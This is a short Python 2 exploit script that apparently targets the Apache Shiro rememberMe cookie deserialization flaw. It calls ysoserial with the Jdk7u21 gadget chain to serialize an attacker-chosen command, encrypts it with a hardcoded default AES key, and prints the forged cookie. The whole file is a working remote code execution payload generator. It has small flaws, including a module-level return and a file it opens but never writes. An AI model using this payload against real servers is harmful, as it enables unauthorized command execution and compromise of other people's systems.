# pip install pycrypto
import sys
import base64
import uuid
import subprocess

from Crypto.Cipher import AES
 
def encode_rememberme(command):
    popen     = subprocess.Popen(['java', '-jar', '/pentest/java/ysoserial.jar', 'Jdk7u21', command], stdout=subprocess.PIPE)
    BS        = AES.block_size
    pad       = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key       = "kPH+bIxk5D2deZiIxcaaaA=="
    mode      = AES.MODE_CBC
    iv        = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    
    return base64_ciphertext

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print 'Usage:', sys.argv[0], 'command_to_execute'
        return

    payload = encode_rememberme(sys.argv[1])    
    with open("/tmp/payload.cookie", "w") as fpw:
        print "rememberMe={}".format(payload.decode())

